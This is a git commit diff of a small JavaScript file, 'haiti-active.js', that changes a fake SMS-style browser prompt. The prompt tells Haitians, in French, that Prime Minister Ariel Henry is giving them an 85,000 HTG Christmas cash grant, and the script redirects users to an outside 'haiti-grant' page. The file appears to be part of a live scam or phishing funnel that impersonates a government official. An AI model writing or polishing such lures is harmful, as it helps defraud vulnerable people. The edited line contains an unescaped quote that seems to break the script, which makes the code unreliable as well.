7a198e9c8cadce6f1bca0feeb6575a48544f20e8
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-21 01:48:00 -0800

    Update haiti-active.js

--- haiti-active.js
+++ haiti-active.js
@@ -1,6 +1,6 @@
 
 var password = 'RETIRER 85 000 HTG'
-password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000 HTG du Le Premier ministre Ariel Henry pour les Haitians. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000 HTG');
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention en espèces de Noël et du nouvel an d'Ariel Henry de 85 000 HTG pour les Haïtiens. Veuillez appuyer sur OK pour récupérer le prix en espèces.   ','RETIRER 85 000 HTG');
 if (password != 'RETIRER 85 000 HTG') {
 location.href='https://get-offre.org/haiti-grant.html';
 }
